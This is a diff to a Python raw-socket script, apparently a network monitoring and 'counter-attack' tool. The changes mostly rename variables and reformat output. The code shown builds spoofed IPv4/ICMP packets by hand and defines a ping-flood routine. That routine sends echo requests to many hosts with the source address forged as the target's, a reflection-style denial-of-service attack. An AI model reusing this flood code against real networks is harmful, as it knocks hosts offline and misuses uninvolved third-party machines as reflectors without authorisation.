@@ -99,16 +99,14 @@ def debugPrint():
         if 'MAC' in KNOWN_HOSTS[ip].keys():
             mac = KNOWN_HOSTS[ip]['MAC']
 
-        print('#################')
+        print('####################################################################')
         print('- IP Address: ', ip,
-              '\t- MAC Address: ', mac,
-              '\t- Packet Interval: ', packet_interval,
-              '\t- Last packet at: ', last_packet_at,
-              '\t- Packet counts: ', packet_count)
-        print('#################')
+              '\n- MAC Address: ', mac,
+              '\n- Packet Interval: ', packet_interval,
+              '\n- Last packet at: ', last_packet_at,
+              '\n- Packet counts: ', packet_count)
+        print('####################################################################')
 
-
-# ------------------------ Flooding ------------------------
 
 def getHostsList(ip_attack: str):
     hosts = []
@@ -144,9 +142,9 @@ def pingFloodCounterAttack(ip_attack: str, max_time: int):
             break
 
         for i in range(len(hosts_list)):
-            bot = hosts_list[i]
+            host = hosts_list[i]
             s = getSocket(None, socket.getprotobyname('icmp'))
-            sendPing(s, ip_attack, bot['ip_dest'])
+            sendPing(s, ip_attack, host['ip_dest'])
             s.close()
             status[i] += 1
 
@@ -154,10 +152,6 @@ def pingFloodCounterAttack(ip_attack: str, max_time: int):
     print('Status:', status)
     print(' ------ End flooding ------ ')
 
-
-# ------------------------ Flooding ------------------------
-
-# ------------------------ Send Ping ------------------------
 
 def getChecksum(msg: bytes):
     s = 0
@@ -183,29 +177,28 @@ def getIcmpRequestHeader():
 
 
 def getIcmpPacket():
-    icmp_header_props = getIcmpRequestHeader()
+    icmp_props = getIcmpRequestHeader()
     icmp_header = struct.pack(
         '!BBHHH',
-        icmp_header_props['type'],
-        icmp_header_props['code'],
-        icmp_header_props['checksum'],
-        icmp_header_props['id'],
-        icmp_header_props['seqnumber'],
+        icmp_props['type'],
+        icmp_props['code'],
+        icmp_props['checksum'],
+        icmp_props['id'],
+        icmp_props['seqnumber'],
     )
-
-    padBytes = []
-    startVal = 0x42
-    for i in range(startVal, startVal + 55):
-        padBytes += [(i & 0xff)]  # Keep chars in the 0-255 range
-    data = bytes(padBytes)
+    pad_bytes = []
+    start_value = 0x42
+    for i in range(start_value, start_value + 55):
+        pad_bytes += [(i & 0xff)]
+    data = bytes(pad_bytes)
     checksum = getChecksum(icmp_header + data)
     icmp_header = struct.pack(
         '!BBHHH',
-        icmp_header_props['type'],
-        icmp_header_props['code'],
+        icmp_props['type'],
+        icmp_props['code'],
         checksum,
-        icmp_header_props['id'],
-        icmp_header_props['seqnumber'],
+        icmp_props['id'],
+        icmp_props['seqnumber'],
     )
     icmp_packet = icmp_header + data
     return icmp_packet
@@ -240,40 +233,32 @@ def getIPPacket(ip_source: str, ip_dest: str):
         ip_saddr,
         ip_daddr,
     )
-
     return ip_h
 
 
-def sendPing(s: socket.socket, ip_source: str, ip_dest: str):
-    icmp_pkt = getIcmpPacket()
-    ip_h = getIPPacket(ip_source, ip_dest)
-
-    dest_addr = socket.gethostbyname(ip_dest)
-    s.sendto(ip_h + icmp_pkt, (dest_addr, 0))
+def sendPing(sck: socket.socket, src_address: str, dst_address: str):
+    icmp_packet = getIcmpPacket()
+    dest_addr = socket.gethostbyname(dst_address)
+    sck.sendto(getIPPacket(src_address, dst_address) + icmp_packet, (dest_addr, 0))
 
 
-def getSocket(if_net: str, proto: int = socket.ntohs(ETH_P_ALL)):
+def getSocket(p: str, proto: int = socket.ntohs(ETH_P_ALL)):
     try:
         s = None
         if proto == socket.getprotobyname('icmp'):
-            s = socket.socket(socket.AF_INET, socket.SOCK_RAW,
-                              proto)
+            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
         else:
-            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
-                              proto)
+            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, proto)
+
     except OSError as msg:
-        print('failed to create socket', str(msg))
+        print('Error', str(msg))
         sys.exit(1)
 
     if proto == socket.getprotobyname('icmp'):
         s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     else:
-        s.bind((if_net, 0))
+        s.bind((p, 0))
     return s
-
-
-
-
 
 
 if __name__ == "__main__":
